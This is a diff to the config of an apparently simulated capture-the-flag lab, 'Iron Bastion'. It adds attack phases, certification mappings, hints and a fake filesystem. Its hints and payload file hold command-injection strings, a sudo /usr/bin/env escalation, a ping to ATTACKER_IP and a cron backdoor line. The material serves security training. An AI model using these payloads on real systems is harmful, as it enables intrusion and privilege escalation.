@@ -18,14 +18,65 @@ const A3Config = {
     trackerKey: 'ctf_a3',
 
     // ═══════════════════════════════════════════════════════
+    // PHASE SYSTEM (Multi-layer attack chain)
+    // ═══════════════════════════════════════════════════════
+
+    phases: [
+        {
+            id: 'recon',
+            name: 'Reconnaissance',
+            icon: '\uD83D\uDD0D',
+            description: 'Map the target\'s attack surface. Identify open ports and enumerate running services on Iron Bastion.',
+            requiredFlags: [],
+            mitre: ['T1046', 'T1595.002', 'T1592.002'],
+            unlocks: ['app_analysis'],
+            locked: false
+        },
+        {
+            id: 'app_analysis',
+            name: 'Application Analysis',
+            icon: '\uD83C\uDF10',
+            description: 'Explore the monitoring dashboard. Locate input fields that pass data to OS commands without sanitization.',
+            requiredFlags: [],
+            mitre: ['T1190', 'T1592.004', 'T1083'],
+            unlocks: ['injection'],
+            locked: true
+        },
+        {
+            id: 'injection',
+            name: 'Command Injection',
+            icon: '\uD83D\uDC89',
+            description: 'Inject OS commands through the diagnostic tools form. Break out of the web context and gain initial shell access as www-data.',
+            requiredFlags: ['user'],
+            mitre: ['T1059.004', 'T1190', 'T1055'],
+            unlocks: ['privesc'],
+            locked: true
+        },
+        {
+            id: 'privesc',
+            name: 'Privilege Escalation',
+            icon: '\uD83D\uDD13',
+            description: 'Escalate from www-data to root by abusing a misconfigured sudo entry for /usr/bin/env. Capture the root flag.',
+            requiredFlags: ['root'],
+            mitre: ['T1068', 'T1548.003', 'T1611'],
+            unlocks: [],
+            locked: true
+        }
+    ],
+
+    // ═══════════════════════════════════════════════════════
     // CERT OBJECTIVES (Assessment Mode — AR-7)
     // ═══════════════════════════════════════════════════════
 
     certObjectives: {
-        certPath: 'PT0-002',
+        certPath: 'SY0-701',
         mappings: [
-            { flagId: 'user', objective: '3.1', description: 'Given a scenario, apply attacks and exploits', skill: 'Command Injection Discovery' },
-            { flagId: 'root', objective: '3.1', description: 'Given a scenario, apply attacks and exploits', skill: 'Reverse Shell Escalation' }
+            { flagId: 'user', objective: '1.2', description: 'Given a scenario, analyze indicators of malicious activity — Injection attacks', skill: 'Command Injection Discovery' },
+            { flagId: 'user', objective: '2.4', description: 'Given a scenario, analyze indicators associated with application attacks — Unsanitized input', skill: 'Input Validation Exploitation' },
+            { flagId: 'root', objective: '1.4', description: 'Given a scenario, analyze potential indicators associated with network attacks — OS command execution', skill: 'Injected Shell Command Execution' },
+            { flagId: 'root', objective: '4.1', description: 'Given a scenario, apply common security techniques — Least privilege violations', skill: 'sudo Misconfiguration Abuse' },
+            { flagId: 'root', objective: '3.3', description: 'Given a scenario, implement and maintain identity and access management — Privilege escalation via SUID/sudo', skill: 'Privilege Escalation via env Bypass' },
+            { flagId: 'user', objective: '2.2', description: 'Summarize various types of vulnerabilities — Application/service vulnerabilities', skill: 'Web Application Command Injection' }
         ]
     },
 
@@ -105,22 +156,26 @@ const A3Config = {
         {
             id: 'hint1',
             text: "The diagnostic tools form passes your input directly to a system command. What happens if you add a semicolon (;) after the IP?",
-            penalty: -50
+            cost: 10,
+            penalty: -10
         },
         {
             id: 'hint2',
             text: "Try: 127.0.0.1; whoami \u2014 if it returns 'www-data', you have command injection. Now explore the filesystem.",
-            penalty: -50
+            cost: 25,
+            penalty: -25
         },
         {
             id: 'hint3',
             text: "The user flag is in /home/monitor_svc/user.txt. Use: 127.0.0.1; cat /home/monitor_svc/user.txt",
+            cost: 50,
             penalty: -50
         },
         {
             id: 'hint4',
             text: "Check sudo permissions with 127.0.0.1; sudo -l. The /usr/bin/env binary can be exploited: 127.0.0.1; sudo /usr/bin/env cat /root/root.txt",
-            penalty: -50
+            cost: 75,
+            penalty: -75
         }
     ],
 
@@ -129,7 +184,15 @@ const A3Config = {
     // ═══════════════════════════════════════════════════════
 
     lore: {
-        outro: 'The Phantom Shell has spoken. Iron Bastion\'s system monitoring dashboard was the gateway \u2014 unsanitized input in their diagnostic tools allowed you to break free of the web application and take command of the server itself. From www-data to root, the bastion has fallen.'
+        intro: 'Iron Bastion is the crown jewel of a mid-sized managed security provider — the internal server that monitors their entire client infrastructure. Intelligence suggests the admin team deployed a Node.js-backed diagnostic dashboard months ago without security review. A rushed contractor left the ping and traceroute tools hooked directly to shell_exec with no input sanitization. Your mission: compromise the web app via command injection, escalate to root, and prove the bastion has no walls.',
+        scenario: 'The Iron Bastion development team moved fast to deliver the v3.2.1 monitoring dashboard before a client audit. The lead engineer copy-pasted a PHP diagnostic snippet from a 2014 Stack Overflow answer. The security team raised a flag during sprint review — "the host parameter goes straight to shell_exec" — but the sprint was already shipped. The CTO said the tool was "internal only." It is now exposed on port 80.',
+        outro: 'The Phantom Shell has spoken. Iron Bastion\'s system monitoring dashboard was the gateway \u2014 unsanitized input in their diagnostic tools allowed you to break free of the web application and take command of the server itself. From www-data to root, the bastion has fallen. Every client whose infrastructure ran through this server is now at risk.',
+        ecer: {
+            executive: 'CTO dismissed the security finding as low risk because the tool was "internal only" — but internal ≠ protected, especially after a misconfigured firewall rule exposed port 80 to the subnet',
+            culture: 'No secure code review process, no SDLC enforced, developers copy-pasting shell_exec patterns without understanding the injection surface — speed culture over security culture',
+            employee: 'Contractor used shell_exec($cmd) with raw user input and no allowlist validation, no parameterized command execution, no input stripping. The sudo NOPASSWD entry for /usr/bin/env was left in from a deployment script and never cleaned up',
+            regulatory: 'No OWASP Top 10 compliance check was performed before deployment. The organization\'s SOC 2 audit would have flagged command injection as a critical finding — had anyone run it against this host'
+        }
     },
 
     // ═══════════════════════════════════════════════════════
@@ -639,6 +702,57 @@ if [ $? -ne 0 ]; then
 fi`;
         }
 
+        // ── Decoy: /opt/monitor/config.json ── (rabbit hole — DB creds look juicy but go nowhere)
+        if (p.includes('/opt/monitor/config.json') || p.includes('config.json')) {
+            return `{
+  "server": {
+    "host": "127.0.0.1",
+    "port": 3000,
+    "interface": "lo"
+  },
+  "database": {
+    "host": "127.0.0.1",
+    "port": 5432,
+    "name": "monitor_metrics",
+    "user": "monitor_ro",
+    "password": "M0n1t0r_R34d0nly!"
+  },
+  "alerts": {
+    "cpu_threshold": 90,
+    "mem_threshold": 85,
+    "email": "ops-alerts@iron-bastion.local"
+  }
+}
+[NOTE: DB is PostgreSQL on loopback only. monitor_ro has SELECT-only access. No flags here.]`;
+        }
+
+        // ── Decoy: /etc/cron.d/monitor ── (looks like persistence opportunity — but www-data can't write here)
+        if (p.includes('/etc/cron.d/monitor') || p.includes('/etc/cron.d/')) {
+            return `# Iron Bastion — monitoring cron jobs
+# /etc/cron.d/monitor
+SHELL=/bin/bash
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Health check every 5 minutes — runs as monitor_svc
+*/5 * * * * monitor_svc /opt/monitor/health_check.sh >/dev/null 2>&1
+
+# Log rotation check — runs as root
+@daily root /usr/bin/logrotate /etc/logrotate.conf
+
+[NOTE: You cannot write to /etc/cron.d/ as www-data. Permission denied on all cron paths.]`;
+        }
+
+        // ── Decoy: /home/monitor_svc/.ssh/id_rsa ── (enticing but empty)
+        if (p.includes('/home/monitor_svc/.ssh/id_rsa') || p.includes('/home/monitor_svc/.ssh/')) {
+            return 'cat: /home/monitor_svc/.ssh/id_rsa: Permission denied';
+        }
+
+        // ── Decoy: /etc/sudoers ── (partial read — enough to see www-data entry)
+        if (p.includes('/etc/sudoers')) {
+            return `cat: /etc/sudoers: Permission denied
+[TIP: Use 'sudo -l' via injection to list www-data\'s sudo permissions without needing to read the file directly]`;
+        }
+
         if (p.includes('/var/www/html/monitor/tools/index.php') || p.includes('index.php')) {
             return `<?php
 // Diagnostic Tools - Iron Bastion Monitor v3.2.1
@@ -688,15 +802,19 @@ if (!empty($host)) {
         }
 
         if (p.includes('/opt/monitor')) {
-            return `server.js  health_check.sh  node_modules/  package.json`;
+            return `server.js  health_check.sh  config.json  node_modules/  package.json`;
         }
 
         if (p.includes('/tmp')) {
             return `systemd-private-abc123  sess_4f8a2b1c`;
         }
 
+        if (p.includes('/etc/cron.d')) {
+            return `monitor  anacron  popularity-contest`;
+        }
+
         if (p.includes('/etc')) {
-            return `apache2  crontab  hostname  hosts  passwd  shadow  ssh  sudoers  sudoers.d`;
+            return `apache2  cron.d  crontab  hostname  hosts  passwd  shadow  ssh  sudoers  sudoers.d`;
         }
 
         return `ls: cannot access '${p}': No such file or directory`;
@@ -720,12 +838,20 @@ if (!empty($host)) {
                                     type: 'file',
                                     content: '=== MISSION BRIEFING ===\nTarget: 10.10.14.12 (Iron Bastion)\nObjective: Command Injection exploitation\n\nThe target is running a system monitoring dashboard.\nRecon indicates a diagnostic tools page that may pass\nunsanitized user input to system commands.\n\nRecon steps:\n1. nmap scan to identify services\n2. Browse the web application at http://10.10.14.12/monitor/\n3. Locate the diagnostic tools page\n4. Test for command injection in input fields\n5. Escalate privileges and find both flags\n\nRemember: semicolons, pipes, and backticks are your friends.\n\nGood luck, operator.'
                                 },
+                                'dead_ends.txt': {
+                                    type: 'file',
+                                    content: '=== DEAD ENDS — DO NOT WASTE TIME ===\n\n[X] SSH brute force (port 22 is FILTERED — not reachable)\n[X] Port 3000 (Node.js) is also FILTERED from this subnet\n[X] /monitor/api/ returns 403 — restricted, no injection surface here\n[X] /monitor/config.php — 403, cannot read or execute\n[X] pkexec / PwnKit — PATCHED on this target (checked version 0.115)\n[X] Dirty Pipe (CVE-2022-0847) — kernel 5.15.0-91, patch applied\n[X] cron job abuse — www-data has no write access to /etc/cron.d\n[X] Writable /tmp reverse shell persistence — cron runs as monitor_svc, not www-data\n\nThe path forward: web injection -> shell -> sudo -l -> /usr/bin/env'
+                                },
                                 'payloads': {
                                     type: 'dir',
                                     children: {
                                         'cmd-injection.txt': {
                                             type: 'file',
                                             content: '=== COMMAND INJECTION PAYLOADS ===\n\n; whoami\n| whoami\n&& whoami\n`whoami`\n$(whoami)\n\n; cat /etc/passwd\n; ls -la /home/\n; id\n; uname -a\n\n=== BLIND INJECTION ===\n; sleep 5\n| sleep 5\n; ping -c 3 ATTACKER_IP\n\n=== PRIVILEGE ESCALATION ===\n; sudo -l\n; find / -perm -4000 2>/dev/null\n; cat /etc/sudoers'
+                                        },
+                                        'decoy_suid_list.txt': {
+                                            type: 'file',
+                                            content: '=== SUID BINARIES — IRON BASTION ===\n(collected via: 127.0.0.1; find / -perm -4000 2>/dev/null)\n\n/usr/bin/passwd\n/usr/bin/chfn\n/usr/bin/chsh\n/usr/bin/gpasswd\n/usr/bin/newgrp\n/usr/bin/sudo\n/usr/bin/mount\n/usr/bin/umount\n/usr/bin/su\n/usr/sbin/pppd\n\n[ANALYSIS] Standard Ubuntu SUID set. No unusual binaries.\nNone of these are exploitable via GTFOBins for this kernel version.\nEscalation path is NOT via SUID — check sudo permissions instead.'
                                         }
                                     }
                                 },
@@ -780,7 +906,35 @@ if (!empty($host)) {
                 },
                 'tmp': {
                     type: 'dir',
-                    children: {}
+                    children: {
+                        'suid_scan_results.txt': {
+                            type: 'file',
+                            content: '=== SUID BINARY SCAN — iron-bastion ===\n[!] NOTE: This scan was run against the WRONG TARGET (10.10.14.99)\n[!] These results are from a different box — do not use for this engagement.\n\n/usr/bin/newgrp\n/usr/bin/chsh\n/usr/bin/passwd\n/usr/bin/chfn\n/usr/bin/gpasswd\n/usr/bin/pkexec   <-- possible CVE-2021-4034 target\n/usr/sbin/pppd\n\n[NOTE] pkexec version 0.105 may be vulnerable to PwnKit.\nTest with: ./cve-2021-4034\n[DEAD END: pkexec is patched on the actual target, this file is stale]'
+                        },
+                        'cron_backdoor_attempt.sh': {
+                            type: 'file',
+                            content: '#!/bin/bash\n# This script was staged for a cronjob persistence attempt\n# TARGET: /etc/cron.d/ write access\n# STATUS: FAILED — www-data cannot write to /etc/cron.d/\n# The cron path in /etc/crontab runs as monitor_svc, not www-data\n# Rabbit hole — cron abuse is not the path forward here\necho "*/1 * * * * root /tmp/rev.sh" >> /etc/cron.d/backdoor'
+                        }
+                    }
+                },
+                'var': {
+                    type: 'dir',
+                    children: {
+                        'log': {
+                            type: 'dir',
+                            children: {
+                                'apache2': {
+                                    type: 'dir',
+                                    children: {
+                                        'access.log': {
+                                            type: 'file',
+                                            content: '10.10.14.12 - - [14/Mar/2024:08:30:01 +0000] "GET /monitor/ HTTP/1.1" 200 4521\n10.10.14.12 - - [14/Mar/2024:08:30:14 +0000] "GET /monitor/tools/ HTTP/1.1" 200 2103\n10.10.14.12 - - [14/Mar/2024:08:31:05 +0000] "POST /monitor/tools/ HTTP/1.1" 200 891\n[NOTE: These are your own requests — this is the KALI attacker machine log, not the target]'
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
                 }
             }
         }
